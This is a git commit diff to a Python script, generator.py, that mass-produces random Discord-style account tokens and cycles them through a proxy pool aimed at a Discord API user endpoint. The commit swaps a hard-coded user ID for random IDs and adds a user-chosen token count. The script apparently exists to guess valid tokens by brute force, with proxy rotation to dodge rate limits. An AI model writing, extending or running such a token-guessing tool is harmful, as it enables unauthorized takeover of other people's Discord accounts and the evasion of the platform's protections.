f3de8183ab20ac1ac27ee25402e8c79bc58078b2
h4cknor1n <78205511+h4cknor1n@users.noreply.github.com>
2021-01-29 14:08:34 +0300

    Update generator.py

--- generator.py
+++ generator.py
@@ -7,23 +7,23 @@ from itertools import cycle
 import base64
 from random import randint
 
-# N = input("How many tokens : ")
-# count = 0
+N = input("How many tokens : ")
+count = 0
 current_path = os.path.dirname(os.path.realpath(__file__))
 url = "https://discordapp.com/api/v6/users/@me/library"
 
-while(True):
+while(int(count) < int(N)):
     tokens = []
     base64_string = "=="
     while(base64_string.find("==") != -1):
-        sample_string = str(630689758841929728) # str(randint(000000000000000000, 999999999999999999))
-        sample_string_bytes = sample_string.encode("UTF-8")
+        sample_string = str(randint(000000000000000000, 999999999999999999))
+        sample_string_bytes = sample_string.encode("ascii")
         base64_bytes = base64.b64encode(sample_string_bytes)
         base64_string = base64_bytes.decode("ascii")
     else:
         token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                       for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
-        # count += 1
+        count += 1
         tokens.append(token)
     proxies = proxygen.get_proxies()
     proxy_pool = cycle(proxies)
